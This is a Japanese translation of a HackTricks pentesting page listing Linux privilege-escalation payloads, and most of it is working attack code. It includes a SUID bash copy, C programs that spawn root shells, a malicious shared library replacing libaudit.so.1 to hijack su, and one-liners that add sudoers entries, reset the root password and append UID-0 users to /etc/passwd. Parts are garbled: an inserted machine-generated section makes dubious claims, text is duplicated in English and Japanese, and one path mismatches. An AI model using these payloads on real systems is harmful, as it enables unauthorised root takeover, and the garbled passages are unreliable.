# 実行するペイロード

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## ペイロードの実行

このセクションでは、特権昇格を行うために使用できるさまざまなペイロードについて説明します。これらのペイロードは、標準的なLinuxシステムで実行されることを想定しています。

### 1. SUIDバイナリの利用

SUID（Set User ID）バイナリは、実行時に所有者の特権で実行されるバイナリです。これを利用すると、特権のあるコマンドを実行できます。

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

上記のコマンドを実行すると、SUIDビットが設定されたバイナリのリストが表示されます。これらのバイナリを使用して、特権昇格を試みることができます。

### 2. LD_PRELOADを使用したライブラリのロード

LD_PRELOAD環境変数を使用すると、特定のライブラリをプロセスのロードパスに追加できます。これを利用して、特権のあるライブラリをロードし、特権昇格を行うことができます。

```bash
$ gcc -shared -o /tmp/exploit.so /tmp/exploit.c
$ LD_PRELOAD=/tmp/exploit.so <command>
```

上記のコマンドを実行すると、`<command>`が実行される際に`/tmp/exploit.so`がロードされます。これにより、特権のあるコードが実行され、特権昇格が可能になります。

### 3. カーネルモジュールのロード

カーネルモジュールをロードすることで、特権昇格を行うことができます。以下のコマンドを使用して、カーネルモジュールをロードします。

```bash
$ insmod /path/to/module.ko
```

上記のコマンドを実行すると、指定したカーネルモジュールがロードされます。これにより、特権のある機能を利用して特権昇格を行うことができます。

### 4. プロセスの権限昇格

特権昇格を行うために、既存のプロセスの権限を昇格させることもできます。以下のコマンドを使用して、プロセスの権限を昇格させます。

```bash
$ gdb -p <pid>
(gdb) call setuid(0)
(gdb) call setgid(0)
(gdb) detach
(gdb) quit
```

上記のコマンドを実行すると、指定したプロセスの権限が昇格されます。これにより、特権のある操作を実行することができます。

これらのペイロードを使用して、特権昇格を試みることができます。ただし、これらの操作は合法的な目的でのみ使用するようにしてください。
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## ファイルを上書きして特権を昇格させる

### 一般的なファイル

* パスワード付きのユーザーを _/etc/passwd_ に追加する
* _/etc/shadow_ 内のパスワードを変更する
* _/etc/sudoers_ 内のsudoersにユーザーを追加する
* 通常 _/run/docker.sock_ や _/var/run/docker.sock_ にある、dockerソケットを悪用する

### ライブラリの上書き

いくつかのバイナリで使用されているライブラリをチェックします。この場合は `/bin/su` です。
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
この場合は、`/lib/x86_64-linux-gnu/libaudit.so.1`をなりすましましょう。\
したがって、**`su`**バイナリで使用されるこのライブラリの関数をチェックします。
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
シンボル`audit_open`、`audit_log_acct_message`、`audit_log_acct_message`、および`audit_fd`はおそらくlibaudit.so.1ライブラリから来ています。悪意のある共有ライブラリによってlibaudit.so.1が上書きされるため、これらのシンボルは新しい共有ライブラリに存在する必要があります。そうでない場合、プログラムはシンボルを見つけることができず、終了します。
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
今、**`/bin/su`** を呼び出すだけで、rootとしてシェルを取得できます。

## スクリプト

rootに何かを実行させることはできますか？

### **www-dataをsudoersに追加**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **ルートパスワードの変更**

To change the root password, you can use the following command:

ルートパスワードを変更するには、次のコマンドを使用します。

```bash
sudo passwd root
```

You will be prompted to enter the new password twice. After successfully changing the password, you can log in as root using the new password.

新しいパスワードを2回入力するように求められます。パスワードの変更に成功した後は、新しいパスワードを使用してルートとしてログインできます。
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd に新しい root ユーザーを追加する

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有する**には、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>
